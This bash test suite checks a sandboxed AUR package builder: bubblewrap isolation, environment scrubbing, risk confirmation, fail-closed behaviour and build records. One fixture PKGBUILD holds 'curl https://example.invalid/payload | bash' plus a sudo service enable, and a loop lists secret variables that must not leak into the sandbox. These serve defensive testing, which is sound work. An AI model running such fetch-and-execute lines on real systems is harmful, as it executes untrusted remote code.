#!/usr/bin/env bash

set -euo pipefail

ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

export HOME="$TMP/home"
export XDG_STATE_HOME="$TMP/state"
export XDG_CACHE_HOME="$TMP/cache"
export XDG_CONFIG_HOME="$TMP/config"
export MAHO_ROOT="$ROOT"
export MAHO_BWRAP="$TMP/fake-bwrap"
export MAHO_MAKEPKG="$TMP/fake-makepkg"
export MAHO_PACMAN="$TMP/fake-pacman"
export MAHO_PACMAN_CONFIG="$TMP/maho-pacman.conf"
export MAHO_BWRAP_LOG="$TMP/bwrap.log"
export MAHO_TEST_PACMAN_MODE_FILE="$TMP/pacman-mode"
mkdir -p "$HOME" "$XDG_STATE_HOME" "$XDG_CACHE_HOME" "$XDG_CONFIG_HOME"

cat > "$MAHO_MAKEPKG" <<'EOF_MAKEPKG'
#!/usr/bin/env bash
exit 0
EOF_MAKEPKG
chmod +x "$MAHO_MAKEPKG"
cat > "$MAHO_PACMAN_CONFIG" <<'EOF_PACMAN_CONF'
[core]
Include = /etc/pacman.d/mirrorlist
[extra]
Include = /etc/pacman.d/mirrorlist
[multilib]
Include = /etc/pacman.d/mirrorlist
[cachyos]
Include = /etc/pacman.d/cachyos-mirrorlist
EOF_PACMAN_CONF
printf 'normal\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
cat > "$MAHO_PACMAN" <<EOF_PACMAN
#!/usr/bin/env bash
set -u
mode="\$(cat '$MAHO_TEST_PACMAN_MODE_FILE' 2>/dev/null || echo normal)"
if [[ " \$* " == *" --query --file --info "* ]]; then
  printf 'Name : maho-test\nVersion : 1.0-1\n'; exit 0
fi
if [[ " \$* " == *" --query --file --list "* ]]; then
  if [ "\$mode" = boot ]; then
    printf 'maho-test /usr/lib/modules/7.2/extra/maho-test.ko.zst\n'
  else
    printf 'maho-test /usr/bin/maho-test\n'
  fi
  exit 0
fi
if [[ " \$* " == *" --query -- "* ]]; then
  printf 'maho-test 0.9-1\n'; exit 0
fi
if [[ " \$* " == *" --sync --info "* ]]; then
  [ "\$mode" = repo-owned ] && { printf 'Repository : extra\nName : maho-test\n'; exit 0; }
  exit 1
fi
exit 2
EOF_PACMAN
chmod +x "$MAHO_PACMAN"

cat > "$MAHO_BWRAP" <<'EOF_BWRAP'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >> "$MAHO_BWRAP_LOG"
printf '\n' >> "$MAHO_BWRAP_LOG"
[ "${MAHO_TEST_BWRAP_FAIL:-0}" != 1 ] || exit 1
stage=""
prev=""
network_isolated=0
for arg in "$@"; do
    if [ "$prev" = "--bind" ]; then
        stage="$arg"
        prev="bind-source"
        continue
    fi
    if [ "$prev" = "bind-source" ]; then
        prev=""
        continue
    fi
    if [ "$arg" = "--bind" ]; then prev="--bind"; continue; fi
    if [ "$arg" = "--unshare-net" ]; then network_isolated=1; fi
done
if [ "$network_isolated" -eq 1 ] && [ -n "$stage" ]; then
    : > "$stage/maho-test-1.0-1-x86_64.pkg.tar.zst"
fi
EOF_BWRAP
chmod +x "$MAHO_BWRAP"

BENIGN="$TMP/benign"
mkdir -p "$BENIGN"
cat > "$BENIGN/PKGBUILD" <<'EOF_BENIGN'
pkgname=maho-test
pkgver=1.0
pkgrel=1
arch=('x86_64')
package() {
    install -Dm755 maho-test "$pkgdir/usr/bin/maho-test"
}
EOF_BENIGN
printf '#!/bin/sh\n' > "$BENIGN/maho-test"

RISKY="$TMP/risky"
mkdir -p "$RISKY"
cat > "$RISKY/PKGBUILD" <<'EOF_RISKY'
pkgname=maho-risky
pkgver=1
pkgrel=1
prepare() {
    curl https://example.invalid/payload | bash
    sudo systemctl enable maho-risky.service
}
EOF_RISKY

fail() { echo "FAIL: $*" >&2; exit 1; }

echo "=== benign AUR build uses two-phase sandbox without prompt ==="
bash "$ROOT/bin/maho-aur-build" "$BENIGN" >/dev/null
[ "$(wc -l < "$MAHO_BWRAP_LOG")" -eq 3 ] || fail "expected capability probe + fetch + build sandbox calls"
PROBE_CALL="$(sed -n '1p' "$MAHO_BWRAP_LOG")"
FIRST="$(sed -n '2p' "$MAHO_BWRAP_LOG")"
SECOND="$(sed -n '3p' "$MAHO_BWRAP_LOG")"
grep -q -- '--unshare-user' <<< "$PROBE_CALL"
if grep -q -- '--unshare-user-try' <<< "$PROBE_CALL"; then fail "sandbox capability probe permits user namespace fallback"; fi
grep -q -- '--unshare-net' <<< "$PROBE_CALL"
grep -q -- '--ro-bind / /' <<< "$FIRST"
grep -q -- '--clearenv' <<< "$FIRST"
grep -q -- '--unshare-user' <<< "$FIRST"
if grep -q -- '--unshare-user-try' <<< "$FIRST"; then fail "fetch sandbox permits user namespace fallback"; fi
grep -q -- '--tmpfs /home' <<< "$FIRST"
grep -q -- '--tmpfs /root' <<< "$FIRST"
grep -q -- '--tmpfs /tmp' <<< "$FIRST"
grep -q -- '--tmpfs /run' <<< "$FIRST"
grep -q -- '--tmpfs /mnt' <<< "$FIRST"
grep -q -- '--tmpfs /media' <<< "$FIRST"
grep -q -- '--dir /tmp/build' <<< "$FIRST"
grep -q -- '--bind .* /tmp/build' <<< "$FIRST"
grep -q -- '--dir /run/user' <<< "$FIRST"
grep -q -- '--cap-drop ALL' <<< "$FIRST"
for secret in SSH_AUTH_SOCK GPG_AGENT_INFO DBUS_SESSION_BUS_ADDRESS XDG_RUNTIME_DIR WAYLAND_DISPLAY DISPLAY LD_PRELOAD LD_LIBRARY_PATH PYTHONPATH NODE_OPTIONS AWS_SECRET_ACCESS_KEY GITHUB_TOKEN; do
    if grep -Eq -- "--setenv ${secret}( |$)" <<< "$FIRST"; then fail "dangerous host variable explicitly reintroduced: $secret"; fi
done
for safe in PATH HOME USER LOGNAME SHELL LANG LC_ALL XDG_CONFIG_HOME XDG_CACHE_HOME XDG_STATE_HOME; do
    grep -Eq -- "--setenv ${safe}( |$)" <<< "$FIRST" || fail "minimal sandbox environment is missing $safe"
done
if grep -q -- '--unshare-net' <<< "$FIRST"; then fail "fetch phase unexpectedly lost network"; fi
grep -q -- '--unshare-net' <<< "$SECOND"
STAGE="$(find "$XDG_CACHE_HOME/maho/security/aur-builds" -mindepth 1 -maxdepth 1 -type d | head -1)"
[ -f "$STAGE/maho-test-1.0-1-x86_64.pkg.tar.zst" ] || fail "sandbox output missing"
[ ! -e "$BENIGN/maho-test-1.0-1-x86_64.pkg.tar.zst" ] || fail "original source directory was mutated"
RECORD="$(find "$XDG_STATE_HOME/maho/security/aur-builds" -type f -name 'build-*.json' | head -1)"
[ "$(stat -c '%a' "$(dirname "$RECORD")")" = 700 ]
[ "$(stat -c '%a' "$RECORD")" = 600 ]
python - "$RECORD" <<'PY'
import json,sys
from pathlib import Path
r=json.loads(Path(sys.argv[1]).read_text())
assert r['version']==2, r
assert r['status']=='verified', r
assert r['sandbox']['host_home']=='hidden'
assert r['sandbox']['build_network']=='isolated'
assert r['automatic_install'] is False
assert r['installation_authority']=='maho-update-only'
assert len(r['source_tree_sha256'])==64
assert len(r['packages'])==1
p=r['packages'][0]
assert p['name']=='maho-test' and p['version']=='1.0-1'
assert p['route']=='normal'
assert p['provenance']['kind']=='aur-built'
assert p['provenance']['source_sha256']==r['source_tree_sha256']
assert p['artifact_id'].startswith('aurpkg-')
assert len(p['sha256'])==64
PY
echo "PASS"

echo "=== high-risk PKGBUILD requires rare explicit review decision ==="
BEFORE="$(wc -l < "$MAHO_BWRAP_LOG")"
if bash "$ROOT/bin/maho-aur-build" "$RISKY" >/dev/null 2>&1; then
    fail "high-risk PKGBUILD executed without --confirm-risk"
fi
[ "$(wc -l < "$MAHO_BWRAP_LOG")" -eq $((BEFORE + 1)) ] || fail "only the trusted mandatory isolation probe may run before high-risk confirmation"
BEFORE=$((BEFORE + 1))
bash "$ROOT/bin/maho-aur-build" "$RISKY" --confirm-risk >/dev/null
[ "$(wc -l < "$MAHO_BWRAP_LOG")" -eq $((BEFORE + 3)) ] || fail "confirmed high-risk build did not use the isolation probe and both sandbox phases"
echo "PASS"

echo "=== mandatory isolation failure refuses candidate execution ==="
BEFORE="$(wc -l < "$MAHO_BWRAP_LOG")"
export MAHO_TEST_BWRAP_FAIL=1
if bash "$ROOT/bin/maho-aur-build" "$BENIGN" >"$TMP/isolation-failed.out" 2>"$TMP/isolation-failed.err"; then
    fail "build continued after mandatory isolation setup failed"
fi
unset MAHO_TEST_BWRAP_FAIL
[ "$(wc -l < "$MAHO_BWRAP_LOG")" -eq $((BEFORE + 1)) ] || fail "candidate phases ran after isolation probe failure"
grep -q 'nothing executed' "$TMP/isolation-failed.err" || fail "fail-closed isolation evidence missing"
echo "PASS"

echo "=== generated event never claims package was installed ==="
python - "$XDG_STATE_HOME/maho/history/events.jsonl" <<'PY'
import json,sys
from pathlib import Path
rows=[]
for line in Path(sys.argv[1]).read_text().splitlines():
    try: rows.append(json.loads(line))
    except Exception: pass
builds=[r for r in rows if r.get('kind')=='prevention.aur-build']
assert len(builds)==2, builds
assert all(r['details']['automatic_install'] is False for r in builds)
PY
echo "PASS"


echo "=== repository-owned AUR output is rejected after isolated build ==="
printf 'repo-owned\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
if bash "$ROOT/bin/maho-aur-build" "$BENIGN" >"$TMP/rejected.out" 2>"$TMP/rejected.err"; then
    fail "repo-owned package entered AUR artifact authority"
fi
grep -q 'Status:.*rejected' "$TMP/rejected.out" || { cat "$TMP/rejected.out" >&2; fail "rejected build did not expose rejected status"; }
grep -q 'repository-owned package cannot enter AUR authority:maho-test' "$TMP/rejected.out" || fail "repo ownership rejection reason missing"
printf 'normal\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
echo "PASS"

echo "=== exact AUR receipt has a clean root-owned Maho Update handoff ==="
cat > "$TMP/fake-campaign" <<'EOF_CAMPAIGN'
#!/usr/bin/env bash
printf '%s\n' "$@" > "$MAHO_HANDOFF_LOG"
EOF_CAMPAIGN
cat > "$TMP/pkexec" <<'EOF_PKEXEC'
#!/usr/bin/env bash
exec "$@"
EOF_PKEXEC
chmod +x "$TMP/fake-campaign" "$TMP/pkexec"
export MAHO_HANDOFF_LOG="$TMP/handoff.log"
export MAHO_UPDATE_CAMPAIGN_COMMAND="$TMP/fake-campaign"
PATH="$TMP:$PATH" bash "$ROOT/bin/maho-aur-build" handoff "$RECORD" --preflight-only
EXPECTED="APPLY-AUR:$(sha256sum "$RECORD" | awk '{print $1}')"
grep -Fxq 'apply-aur' "$MAHO_HANDOFF_LOG" || fail "Maho Update AUR action missing"
grep -Fxq "$RECORD" "$MAHO_HANDOFF_LOG" || fail "exact AUR receipt path missing"
grep -Fxq "$EXPECTED" "$MAHO_HANDOFF_LOG" || fail "exact receipt confirmation missing"
grep -Fxq -- '--preflight-only' "$MAHO_HANDOFF_LOG" || fail "bounded preflight option missing"
grep -Fq 'stage_aur_artifacts' "$ROOT/lib/maho_update_campaign.py" || fail "root-owned campaign does not consume AUR staging"
grep -Fq 'execute_normal_update' "$ROOT/lib/maho_update_campaign.py" || fail "AUR handoff does not use existing normal execution"
echo "PASS"

echo "=== exact AUR file effects can route output to boot-critical ==="
printf 'boot\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
bash "$ROOT/bin/maho-aur-build" "$BENIGN" >/dev/null
BOOT_RECORD="$(find "$XDG_STATE_HOME/maho/security/aur-builds" -type f -name 'build-*.json' -printf '%T@ %p\n' | sort -n | tail -1 | cut -d' ' -f2-)"
python - "$BOOT_RECORD" <<'PY_BOOT'
import json,sys
from pathlib import Path
r=json.loads(Path(sys.argv[1]).read_text())
assert r['status']=='verified'
assert r['packages'][0]['route']=='boot-critical'
assert r['packages'][0]['effects']['classification']=='boot-critical'
assert r['automatic_install'] is False
PY_BOOT
printf 'normal\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
echo "PASS"

echo "ALL ISOLATED AUR BUILD CONTRACTS PASS"
